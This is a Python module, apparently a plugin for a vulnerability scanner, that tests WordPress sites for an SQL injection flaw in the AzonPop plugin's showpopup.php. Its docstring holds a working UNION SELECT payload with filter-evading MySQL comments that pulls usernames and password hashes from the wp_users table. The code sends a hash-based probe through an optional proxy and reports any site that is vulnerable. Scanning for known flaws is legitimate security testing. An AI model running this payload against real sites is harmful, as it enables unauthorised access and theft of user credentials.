#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Wordpress AzonPop插件SQL注入
referer: https://cxsecurity.com/issue/WLB-2016010049
author: Ascotbe
reference: Lucifer
description: payload:/wp-content/plugins/AzonPop/files/view/showpopup.php?popid=null /*!00000union*/ select 1,2,/*!00000gRoup_ConCat(unhex(hex(user_login)),0x3c2f62723e,unhex(hex(user_pass)))*/,4,5 /*!00000from*/ wp_users
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/wp-content/plugins/AzonPop/files/view/showpopup.php?popid=null%20/*!00000union*/%20select%201,2,/*!00000gRoup_ConCat(unhex(hex(Md5(1234))),0x3c2f62723e,unhex(hex(Md5(1234))))*/,4,5%20/*!00000from*/%20wp_users"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if  con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
            Medusa = "{} 存在Wordpress AzonPop插件SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass
